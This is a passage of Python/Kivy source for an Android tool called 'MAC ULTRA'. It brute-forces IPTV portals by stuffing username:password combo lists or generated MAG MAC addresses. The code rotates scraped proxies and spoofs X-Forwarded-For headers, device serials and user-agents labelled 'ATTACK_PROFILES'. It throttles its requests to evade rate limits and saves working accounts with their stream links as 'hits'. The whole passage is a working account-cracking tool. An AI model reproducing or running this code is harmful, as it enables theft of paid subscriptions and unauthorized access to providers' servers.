                mPlayer.setDataSource(MUSIC_PATH)
            else:
                return
            mPlayer.prepare(); mPlayer.setLooping(True); mPlayer.start()
        except: pass

    def stop_native_audio(self, *a):
        if not HAS_JNIUS: return
        try:
            if mPlayer.isPlaying(): mPlayer.stop()
        except: pass

    def create_stat_box(self, p, t, v, c):
        box = StyledCard(orientation="vertical", padding=8); box.add_widget(Label(text=t, font_size="11sp", color=(0.7,0.7,0.7,1))); lbl = Label(text=v, font_size="24sp", bold=True, color=c)
        box.add_widget(lbl); p.add_widget(box); return lbl

    def update_slider_label(self, i, v): self.detail_status.text, self.detail_status.color = ("ALLES SPEICHERN", GREEN) if v == 1 else ("NUR MAC/URL", RED)
    def load_combos(self):
        files = []
        for folder in get_data_dirs("Combo"):
            if not os.path.exists(folder):
                continue
            try:
                files.extend([f for f in os.listdir(folder) if f.lower().endswith(".txt")])
            except Exception:
                pass
        files = sorted(set(files))
        return files if files else ["NO COMBOS FOUND"]

    def refresh_file_lists(self, *a):
        combos = self.load_combos()
        self.file_spinner.values = combos
        self.file_spinner.text = combos[0] if combos and combos[0] != "NO COMBOS FOUND" else "NO COMBOS FOUND"
        if combos and combos[0] != "NO COMBOS FOUND":
            self.update_log_safe(f"[color=00FF00][OK][/color] {len(combos)} Combo-Datei(en) gefunden.")
        else:
            dirs = "\n".join(get_data_dirs("Combo")[:4])
            self.update_log_safe("[color=FF0000][INFO][/color] Keine Combos gefunden. Prüfe /storage/emulated/0/Combo und erlaube Alle-Dateien-Zugriff.")
            self.update_log_safe(f"[color=FFFF00][ORDNER][/color]\n{dirs}")

    def refresh_portal_lists(self, *a):
        vals = self.load_portal_lists()
        self.portal_file_spinner.values = vals
        if self.portal_file_spinner.text not in vals:
            self.portal_file_spinner.text = "SELECT PORTAL LIST"

    def load_proxies(self):
        files = []
        for folder in get_data_dirs("proxies"):
            if not os.path.exists(folder):
                continue
            try:
                files.extend([f for f in os.listdir(folder) if f.lower().endswith(".txt")])
            except Exception:
                pass
        files = sorted(set(files))
        return files if files else ["NO PROXIES FOUND"]

    def load_portal_lists(self):
        files = []
        for folder in get_data_dirs("Portals"):
            if not os.path.exists(folder):
                continue
            try:
                files.extend([f for f in os.listdir(folder) if f.lower().endswith(".txt")])
            except Exception:
                pass
        files = sorted(set(files))
        return files + ["USE SINGLE"]

    def paste_clip(self, *a): self.portal_input.text = Clipboard.paste().strip()
    def go_to_manager(self, *a): self.manager.get_screen('portals').load_favs(); self.manager.current = 'portals'
    def toggle_proxy(self, btn):
        self.use_proxies = not self.use_proxies
        if self.use_proxies: btn.text, btn.color, btn.bg_color_inst.rgba = "PROXY: ON", GREEN, (0.05, 0.15, 0.1, 1)
        else: btn.text, btn.color, btn.bg_color_inst.rgba = "PROXY: OFF", RED, (0.15, 0.05, 0.05, 1)

    def open_storage_settings(self, *a):
        if platform == "android":
            request_manage_all_files_access()
            self.update_log_safe("[color=FFFF00][SPEICHER][/color] Bitte 'Alle Dateien Zugriff' für MAC ULTRA erlauben und zurück zur App gehen.")
        else:
            self.update_log_safe("[color=FFFF00][SPEICHER][/color] Nicht-Android Umgebung.")

    def check_storage_status(self, *a):
        if has_manage_all_files_access():
            self.update_log_safe("[color=00FF00][SPEICHER][/color] Alle-Dateien-Zugriff ist aktiv.")
        else:
            self.update_log_safe("[color=FF0000][SPEICHER][/color] Alle-Dateien-Zugriff fehlt. Button SPEICHER drücken.")

    def get_random_ip(self, geo):
        info = GEO_DATA.get(geo, GEO_DATA['DE']); return f"{random.choice(info['ip'])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(2,254)}"

    def detect_portal_geo(self, url):
        u = url.lower()
        if ".it" in u: return 'IT'
        elif ".es" in u: return 'ES'
        elif ".fr" in u: return 'FR'
        return 'DE'

    async def get_portal_isp_info(self, url):
        try:
            domain = url.replace("http://", "").replace("https://", "").split(":")[0].split("/")[0]
            async with httpx.AsyncClient(timeout=5) as client:
                r = await client.get(f"http://ip-api.com/json/{domain}")
                data = r.json()
                if data.get('status') == 'success':
                    cc = data.get('countryCode', '??')
                    return f"[{cc}] {data.get('country')} | {data.get('isp', 'Unknown ISP')}"
        except: pass
        return "[??] Unknown ISP"

    async def smart_sleep(self, status):
        self.request_count += 1
        mode = self.delay_mode_spinner.text
        if "1-3s" in mode: d_min, d_max = 1, 3
        elif "2-4s" in mode: d_min, d_max = 2, 4
        elif "3-6s" in mode: d_min, d_max = 3, 6
        else: d_min = d_max = self.delay_slider.value
        delay = random.uniform(d_min, d_max)
        if status == 429:
            self.error_streak += 1; cooldown = min(15 + self.error_streak * 5, 90)
            self.update_log_safe(f"[color=FF0000][LIMIT][/color] 429 -> {cooldown}s Cooldown"); await asyncio.sleep(cooldown); return
        elif status in [403, 503]: self.error_streak += 1; delay += min(self.error_streak * 1.5, 8)
        else: self.error_streak = 0
        if self.request_count % 50 == 0: await asyncio.sleep(random.uniform(5, 12))
        await asyncio.sleep(delay + random.uniform(0, 0.2))

    def update_log_safe(self, t): Clock.schedule_once(lambda dt: self._do_log(t))
    def _do_log(self, t):
        self.hit_list.append(t)
        if len(self.hit_list) > 10: self.hit_list.pop(0)
        self.log_display.text = "\n".join(self.hit_list); self.log_display.height = self.log_display.texture_size[1] + 20

    async def check_proxies_stable(self, ctx):
        total = len(self.proxy_list)
        if total == 0: return False
        self.update_log_safe(f"[color=00FFFF][PROXY][/color] Checking {total} Proxies..."); valid, checked_count, sem = [], 0, asyncio.Semaphore(50)
        async def check_one(p):
            nonlocal checked_count
            try:
                async with sem:
                    async with httpx.AsyncClient(proxy=f"http://{p}", verify=ctx, timeout=4.0) as client:
                        r = await client.get("http://www.google.com")
                        if r.status_code == 200: valid.append(p)
            except: pass
            checked_count += 1
            if checked_count % 20 == 0 or checked_count == total: Clock.schedule_once(lambda dt: setattr(self.progress_label, 'text', f"PROXY: {len(valid)} UP / {checked_count} CHECKED"))
        await asyncio.gather(*[check_one(p) for p in self.proxy_list])
        self.working_proxies = valid; self.update_log_safe(f"[color=00FF00][PROXY][/color] {len(valid)} Proxies are READY!"); return len(valid) > 0

    def toggle(self, *_):
        if not self.running:
            self.running = True; self.play_native_audio()
            self.start_btn.text, self.start_btn.color = "STOP MAC ULTRA", RED
            self.start_btn.bg_color_inst.rgba = (0.15, 0.05, 0.05, 1)
            Thread(target=lambda: asyncio.run(self.engine()), daemon=True).start()
        else: 
            self.running = False; self.start_btn.text, self.start_btn.color = "START MAC ULTRA", GREEN
            self.start_btn.bg_color_inst.rgba = (0.05, 0.15, 0.1, 1)
            self.status_code_label.text = "STOPPED"; self.update_log_safe("[color=FF0000]!!! MAC ULTRA STOPPED !!![/color]")

    async def engine(self):
        portals = []
        if self.portal_file_spinner.text not in ["SELECT PORTAL LIST", "USE SINGLE"]:
            p_path = first_existing_file(self.portal_file_spinner.text, get_data_dirs("Portals"))
            if os.path.exists(p_path):
                with open(p_path, 'r') as f: portals = [l.strip().split('/c')[0].rstrip('/') for l in f if l.strip().startswith("http")]
        if not portals:
            single = self.portal_input.text.strip().split('/c')[0].rstrip('/')
            if single.startswith("http"): portals = [single]
        if not portals: self.update_log_safe("[color=FF0000][ERROR][/color] No Portals found!"); self.running = False; Clock.schedule_once(lambda dt: self.reset_start_btn()); return
        
        if len(portals) == 1 and ":" not in portals[0].replace("http://", "").replace("https://", ""):
            found_p = await self.find_working_port(portals[0])
            if found_p: portals = [found_p]
            else:
                self.update_log_safe("[color=FF0000][ERROR][/color] No Port found! Stopped."); self.running = False; Clock.schedule_once(lambda dt: self.reset_start_btn()); return

        ctx = ssl.create_default_context(); ctx.set_ciphers(DEFAULT_CIPHERS); ctx.check_hostname, ctx.verify_mode = False, ssl.CERT_NONE

        self.current_api_path, self.current_api_method = await self.discover_best_api(portals[0], ctx)

        self.portal_isp = await self.get_portal_isp_info(portals[0])
        self.update_log_safe(f"[color=FFFF00][INFO][/color] Server: {self.portal_isp}")

        if self.use_proxies:
            if self.proxy_source.text == "FREE (ProxyScrape)":
                try: 
                    async with httpx.AsyncClient() as c:
                        r = await c.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http")
                        self.proxy_list = [p.strip() for p in r.text.split('\n') if p.strip()]
                except: pass
            else:
                f_p = first_existing_file(self.proxy_spinner.text, get_data_dirs("proxies"))
                if os.path.exists(f_p):
                    with open(f_p, 'r') as f: self.proxy_list = [l.strip() for l in f if l.strip()]
            if not await self.check_proxies_stable(ctx): self.update_log_safe("[color=FF0000][ERROR][/color] No Working Proxies!"); self.running = False; Clock.schedule_once(lambda dt: self.reset_start_btn()); return
        
        if self.scan_mode.text == "COMBO FILE":
            path = first_existing_file(self.file_spinner.text, get_data_dirs("Combo"))
            if not path:
                self.update_log_safe("[color=FF0000][ERROR][/color] Combo-Datei nicht gefunden. Drücke REFRESH. App-Ordner steht im Log.")
                self.running = False
                Clock.schedule_once(lambda dt: self.reset_start_btn())
                return
            with open(path, 'r', errors='ignore') as f:
                self.combo_data = [l.strip() for l in f if l.strip()]
        else:
            prefix = self.prefix_spinner.text if self.prefix_spinner.text != "MAC's" else "00:1A:79:"
            self.combo_data = [f"{prefix}{':'.join([f'{random.randint(0,255):02X}' for _ in range(3)])}" for _ in range(int(self.random_count.text or 1000))]
        
        self.total_lines, self.checked, self.hits, self.start_time, self.request_count = len(self.combo_data), 0, 0, time.time(), 0
        Clock.schedule_once(lambda dt: setattr(self.pbar, 'max', self.total_lines))
        queue = asyncio.Queue()
        for l in self.combo_data: queue.put_nowait(l)
        
        num_bots = int(self.bot_slider.value)
        await asyncio.gather(*[self.worker(queue, ctx, portals) for _ in range(num_bots)])
        
        self.running = False; Clock.schedule_once(lambda dt: self.reset_start_btn())

    def reset_start_btn(self, *a):
        self.start_btn.text, self.start_btn.color = "START MAC ULTRA", GREEN
        self.start_btn.bg_color_inst.rgba = (0.05, 0.15, 0.1, 1)

    async def worker(self, queue, ctx, portals):
        while self.running and not queue.empty():
            line = await queue.get()
            tasks = [self.process_check(line, p, ctx) for p in portals]
            await asyncio.gather(*tasks)
            await self.smart_sleep(int(self.last_status) if self.last_status.isdigit() else 200)
            self.checked += 1; Clock.schedule_once(lambda dt: self.refresh_ui())
            queue.task_done()

    async def process_check(self, line, portal, ctx):
        if not self.running: return
        det_geo = self.detect_portal_geo(portal); geo_i = GEO_DATA.get(det_geo, GEO_DATA['DE'])
        px_url = f"http://{random.choice(self.working_proxies)}" if self.use_proxies and self.working_proxies else None
        
        p_name = portal.replace("http://", "").replace("https://", "").split(":")[0]
        ua_headers = random.choice(ATTACK_PROFILES)
        
        async with httpx.AsyncClient(verify=ctx, timeout=12, proxy=px_url, follow_redirects=True) as client:
            try:
                portal_ip = socket.gethostbyname(portal.split("//")[-1].split(":")[0])
                
                clean_mac = line.split(':')[0:6]
                mac_str = ":".join(clean_mac).upper()
                sn_full = hashlib.md5(mac_str.encode()).hexdigest().upper()
                sn_cut = sn_full[:13]
                dev_id = hashlib.sha256(mac_str.encode()).hexdigest().lower()
                fake_ip = self.get_random_ip(det_geo)
                
                if self.engine_mode.text == "M3U SCAN":
                    if ':' in line:
                        u, p = line.split(':')[:2]
                        if self.current_api_method == "GET":
                            r = await client.get(f"{portal}{self.current_api_path}?username={u}&password={p}", headers=ua_headers)
                        else:
                            r = await client.post(f"{portal}{self.current_api_path}", data={"username": u, "password": p}, headers=ua_headers)
                        
                        self.last_status = str(r.status_code)
                        
                        if self.check_vpn_restriction(r.text):
                            self.update_log_safe(f"[color=808080][{p_name}][/color] [color=FFFF00][VPN-LOCK][/color] {u}")
                            return

                        if r.status_code == 200 and 'user_info' in r.text:
                            js_all = r.json(); js = js_all.get('user_info', {})
                            if js.get('auth') == 1:
                                filter_val = self.country_filter.text.upper(); has_country = True
                                if filter_val:
                                    cat_r = await client.get(f"{portal}/player_api.php?username={u}&password={p}&action=get_live_categories", headers=ua_headers)
                                    cat_txt = cat_r.text.upper()
                                    has_country = any(c.strip() in cat_txt for c in filter_val.split(','))
                                
                                if has_country:
                                    exp, days = self.get_clean_time(js.get('exp_date')); cre_date, _ = self.get_clean_time(js.get('created_at'))
                                    act_c, max_c = str(js.get('active_cons','0')), str(js.get('max_connections','1'))
                                    l_c, m_c, s_c, l_l, m_l, s_l = 0, 0, 0, "", "", ""
                                    if self.detail_slider.value == 1:
                                        try:
                                            r_lc = (await client.get(f"{portal}/player_api.php?username={u}&password={p}&action=get_live_categories", headers=ua_headers)).json()
                                            l_c, l_l = len(r_lc), " «💢» ".join([c.get('category_name') for c in r_lc[:10]])
                                            r_mc = (await client.get(f"{portal}/player_api.php?username={u}&password={p}&action=get_vod_categories", headers=ua_headers)).json()
                                            m_c, m_l = len(r_mc), " «💢» ".join([c.get('category_name') for c in r_mc[:10]])
                                            r_sc = (await client.get(f"{portal}/player_api.php?username={u}&password={p}&action=get_series_categories", headers=ua_headers)).json()
                                            s_c, s_l = len(r_sc), " «💢» ".join([c.get('category_name') for c in r_sc[:10]])
                                        except: pass
                                    
                                    star = "⭐" if int(max_c) > 1 else ""
                                    self.hits += 1
                                    vpn_stat = await self.get_vpn_info_api(portal_ip)
                                    self.update_log_safe(f"[color=808080][{p_name}][/color] [color=00FF80][HIT {star}][/color] {u} | [color=00FFFF]{days}[/color]")
                                    self.save_hit(portal, portal_ip, ua_headers.get('User-Agent'), u, exp, days, p, l_c, m_c, s_c, sn_cut, dev_id, l_l, m_l, s_l, geo_i['tz'], act_c, max_c, True, cre_date, vpn_stat)
                
                else:
                    mac = mac_str
                    stb_h = {**ua_headers, "X-STB-SN": sn_cut, "X-STB-Device-ID": dev_id, "X-Forwarded-For": fake_ip, "Cookie": f"mac={urllib.parse.quote(mac)}; stb_lang=en; timezone={urllib.parse.quote(geo_i['tz'])};"}
                    r = await client.get(f"{portal}/portal.php?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml", headers=stb_h)
                    self.last_status = str(r.status_code)
                    
                    if r.status_code == 200 and 'token' in r.text:
                        tk = r.json().get('js', {}).get('token'); stb_h["Authorization"] = f"Bearer {tk}"
                        ri = await client.get(f"{portal}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml", headers=stb_h)
                        js = ri.json().get('js', {}); exp_raw = js.get('end_date') or js.get('phone') or "Unlimited"
                        exp, days = self.get_clean_time(exp_raw); cre_date, _ = self.get_clean_time(js.get('reg_date'))
                        pw, act_c, max_c = str(js.get('parent_password') or "0000"), str(js.get('active_cons') or "0"), str(js.get('max_connections') or "1")
                        
                        l_c, m_c, s_c, l_l, m_l, s_l = 0, 0, 0, "", "", ""
                        if self.detail_slider.value == 1:
                            try:
                                r_l = (await client.get(f"{portal}/portal.php?type=itv&action=get_all_channels&JsHttpRequest=1-xml", headers=stb_h)).json()
                                l_c = len(r_l.get('js', {}).get('data', []))
                                cat_l = (await client.get(f"{portal}/portal.php?type=itv&action=get_genres&JsHttpRequest=1-xml", headers=stb_h)).json()
                                l_l = " «💢» ".join([c.get('title') for c in cat_l.get('js', [])[:10]])
                                r_v = (await client.get(f"{portal}/portal.php?type=vod&action=get_ordered_list&JsHttpRequest=1-xml", headers=stb_h)).json()
                                m_c = r_v.get('js', {}).get('total_items', "0")
                                cat_m = (await client.get(f"{portal}/portal.php?type=vod&action=get_categories&JsHttpRequest=1-xml", headers=stb_h)).json()
                                m_l = " «💢» ".join([c.get('title') for c in cat_m.get('js', [])[:10]])
                                r_s = (await client.get(f"{portal}/portal.php?type=series&action=get_ordered_list&JsHttpRequest=1-xml", headers=stb_h)).json()
                                s_c = r_s.get('js', {}).get('total_items', "0")
                                cat_s = (await client.get(f"{portal}/portal.php?type=series&action=get_categories&JsHttpRequest=1-xml", headers=stb_h)).json()
                                s_l = " «💢» ".join([c.get('title') for c in cat_s.get('js', [])[:10]])
                            except: pass
                        
                        star = "⭐" if int(max_c) > 1 else ""
                        self.hits += 1
                        vpn_stat = await self.get_vpn_info_api(portal_ip)
                        # Syntax-Fehler behoben (self. update_log_safe)
                        self.update_log_safe(f"[color=808080][{p_name}][/color] [color=00FF80][HIT {star}][/color] {mac} | [color=00FFFF]{days}[/color]")
                        self.save_hit(portal, portal_ip, ua_headers.get('User-Agent'), mac, exp, days, pw, l_c, m_c, s_c, sn_cut, dev_id, l_l, m_l, s_l, geo_i['tz'], act_c, max_c, False, cre_date, vpn_stat)
            except:
                self.last_status = "ERR"

    def get_clean_time(self, raw):
        raw_str = str(raw).strip()
        if raw_str.isdigit() and len(raw_str) >= 9:
            try:
                dt = datetime.fromtimestamp(int(raw_str))
                days_diff = (dt - datetime.now()).days
                return dt.strftime('%d.%m.%Y'), f"{days_diff} Tage"
            except:
                pass
        if not raw_str or raw_str.lower() in ["unlimited", "none", "0", "false"]:
            return "Unlimited", "Unlimited"
        try:
            parts = raw_str.split(',')
            clean_date = f"{parts[0].strip()}, {parts[1].strip()}" if len(parts) >= 2 else raw_str.strip()
            for fmt in ("%B %d, %Y", "%Y-%m-%d", "%d.%m.%Y", "%m/%d/%Y"):
                try:
                    dt = datetime.strptime(clean_date, fmt)
                    days_diff = (dt - datetime.now()).days
                    return dt.strftime('%d.%m.%Y'), f"{days_diff} Tage"
                except:
                    continue
        except:
            pass
        return raw_str, "Unlimited"

    def save_hit(self, portal, portal_ip, server_h, id_val, exp, days, pw, live, movies, series, sn, dev_id, l_list, m_list, s_list, tz_val, active_conn, max_conn, is_m3u=False, cre_date="N/A", vpn_info="N/A"):
        sub_folder = "M3U_Hits" if is_m3u else "MAC_Hits"
        final_dir = os.path.join(first_writable_dir("Hits"), "MAC-ULTRA-Hits", sub_folder)
        if not os.path.exists(final_dir):
            os.makedirs(final_dir, exist_ok=True)
        
        domain = portal.replace("http://", "").replace("https://", "").split(":")[0].replace("/", "_")
        m3u = f"{portal}/get.php?mac={id_val}&type=m3u_plus&output=ts" if not is_m3u else f"{portal}/get.php?username={id_val}&password={pw}&output=ts"
        
        id_label = "MAC" if not is_m3u else "USER"
        
        try:
            p_parts = self.portal_isp.split('|')
            nation_part = p_parts[0].strip() if len(p_parts) > 0 else "Unknown"
            provider_part = p_parts[1].strip() if len(p_parts) > 1 else "Unknown"
        except:
            nation_part, provider_part = "Unknown", "Unknown"

        box = f"""
██████████████████████████████████
█
█   ⚡  𝗠𝗔𝗖 𝗨𝗟𝗧𝗥𝗔 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗩𝟮.𝟬  ⚡
█   👤  ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ ᴍᴏʀᴘʜᴇᴜs
█
██████████████████████████████████

DATEN 📂 ACCOUNT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▶ Portal      : {portal}/c/
▶ {id_label.ljust(11)} : {id_val} 🏁
▶ Pass/Pin    : {pw}
▶ Created     : {cre_date}
▶ Expiry      : {exp} (⌛ {days})
▶ SN          : {sn}
▶ Dev ID      : {dev_id}
▶ Os          : ⍟ Android ⍟
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

STATUS 🗿 CHECK
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▶ VPN         : {vpn_info}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

STATISTIK 📊 DATEN
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▶ Live Tv     : {live}
▶ Filme       : {movies}
▶ Serien      : {series}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CONNECTION 🛸 INFO
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▶ Active      : {active_conn}
▶ Max Conn.   : {max_conn}
▶ Zone        : {tz_val}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SERVER 🌐 INFO
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▶ Server      : 🚦 {portal_ip}
▶ Provider    : {provider_part}
▶ Nation      : {nation_part}
▶ Status      : ᴘʀɪᴠᴀᴛᴍᴏᴅᴇ 🏴‍☠️
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔗 M3U LINK:
{m3u}
"""
        if l_list: box += f"\n📂 LIVE LIST\n╚┈❲ {l_list} ❳"
        if m_list: box += f"\n🎬 MOVIE LIST\n╚┈❲ {m_list} ❳"
        if s_list: box += f"\n🎞️ SERIES LIST\n╚┈❲ {s_list} ❳"
        
        box += f"\n\n🛰️ SCANNED: {time.strftime('%H:%M')} | {time.strftime('%d.%m.%Y')}\n██████████████████████████████████████████\n\n"
        
        with open(os.path.join(final_dir, f"{domain}.txt"), "a", encoding="utf-8") as f:
            f.write(box)

    def refresh_ui(self, *a):
        self.pbar.value = self.checked
        self.hit_count_label.text = str(self.hits)
        self.progress_label.text = f"PROGRESS: {self.checked} / {self.total_lines}"
        self.status_code_label.text = self.last_status
        el = time.time() - self.start_time
        if el > 0:
            self.cpm_label.text = str(int((self.checked / el) * 60))

class MagApp(App):
    def build(self):
        self.title = "MAC ULTRA"
        sm = ScreenManager()
        sm.add_widget(SecurityGateScreen(name='security'))
        sm.add_widget(IntroScreen(name='intro'))
        sm.add_widget(MagUltraScreen(name='main'))
        sm.add_widget(PortalManagerScreen(name='portals'))
        sm.current = "security"
        return sm

if __name__ == "__main__":
    MagApp().run()
